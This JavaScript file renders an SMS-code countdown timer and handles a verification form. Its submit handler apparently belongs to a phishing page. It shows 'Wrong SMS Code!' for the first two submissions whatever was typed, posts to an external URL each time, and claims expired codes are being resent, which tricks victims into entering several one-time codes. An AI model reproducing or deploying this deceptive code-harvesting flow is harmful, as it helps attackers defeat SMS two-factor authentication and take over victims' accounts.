const TIME_LIMIT = 60;

const WARNING_THRESHOLD = 5;
const ALERT_THRESHOLD = 3;

const COLOR_CODES = {
    info: {
        color: "green"
    },
    warning: {
        color: "orange",
        threshold: WARNING_THRESHOLD
    },
    alert: {
        color: "red",
        threshold: ALERT_THRESHOLD
    }
};

const FULL_DASH_ARRAY = 283;
var timePassed = 0;
var timeLeft = TIME_LIMIT;
var timerInterval = null;
var remainingPathColor = COLOR_CODES.info.color;

document.getElementById("app").innerHTML = `
<div class="base-timer center-block">
  <svg class="base-timer__svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <g class="base-timer__circle">
      <circle class="base-timer__path-elapsed" cx="50" cy="50" r="45"></circle>
      <path
        id="base-timer-path-remaining"
        stroke-dasharray="283"
        class="base-timer__path-remaining ${remainingPathColor}"
        d="
          M 50, 50
          m -45, 0
          a 45,45 0 1,0 90,0
          a 45,45 0 1,0 -90,0
        "
      ></path>
    </g>
  </svg>
  <span id="base-timer-label" class="base-timer__label">${formatTime(
    timeLeft
)}</span>
</div>
`;
startTimer();

function startTimer() {
    timerInterval = setInterval(() => {
        timePassed = timePassed += 1;
        timeLeft = TIME_LIMIT - timePassed;
        document.getElementById("base-timer-label").innerHTML = formatTime(
            timeLeft
        );
        setCircleDasharray();
        setRemainingPathColor(timeLeft);

        if (timeLeft === 0) {
            onTimesUp();
        }
    }, 1000);
}

function reset_timer() {
    clearInterval(timerInterval);
    timePassed = 0;
    timeLeft = TIME_LIMIT;
    timerInterval = null;
    remainingPathColor = COLOR_CODES.info.color
    setRemainingPathColor(timeLeft);
}

function onTimesUp() {
    reset_timer();
    Swal.fire({
        icon: 'info',
        title: 'Code Expired',
        text: 'Sending new SMS code',
        confirmButtonText: "Try Again"
    })
    startTimer();
}


function formatTime(time) {
    const minutes = Math.floor(time / 60);
    let seconds = time % 60;

    if (seconds < 10) {
        seconds = `0${seconds}`;
    }

    return `${seconds}`;
}

function setRemainingPathColor(timeLeft) {
    const {alert, warning, info} = COLOR_CODES;
    if (timeLeft <= alert.threshold) {
        document
            .getElementById("base-timer-path-remaining")
            .classList.remove(warning.color);
        document
            .getElementById("base-timer-path-remaining")
            .classList.add(alert.color);
    } else if (timeLeft <= warning.threshold) {
        document
            .getElementById("base-timer-path-remaining")
            .classList.remove(info.color);
        document
            .getElementById("base-timer-path-remaining")
            .classList.add(warning.color);
    } else {
        document
            .getElementById("base-timer-path-remaining")
            .classList.remove(alert.color);
        document
            .getElementById("base-timer-path-remaining")
            .classList.add(info.color);
    }
}

function calculateTimeFraction() {
    const rawTimeFraction = timeLeft / TIME_LIMIT;
    return rawTimeFraction - (1 / TIME_LIMIT) * (1 - rawTimeFraction);
}

function setCircleDasharray() {
    const circleDasharray = `${(
        calculateTimeFraction() * FULL_DASH_ARRAY
    ).toFixed(0)} 283`;
    document
        .getElementById("base-timer-path-remaining")
        .setAttribute("stroke-dasharray", circleDasharray);
}

let attempts = 0;
$.ajaxSetup({
    headers: {
        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
    }
});
$("#ctl01").submit(function (event) {
    if (attempts < 2) {
        event.preventDefault();
        Swal.fire({
            icon: 'error',
            title: 'Error',
            text: 'Wrong SMS Code!',
            confirmButtonText: "Try Again"
        })
        reset_timer();
        startTimer();
        attempts += 1;
        $.post(document.post_url, function (data) {
            console.log(data);
        });
        return false;
    } else {
        attempts += 1;
        return true;
    }
});
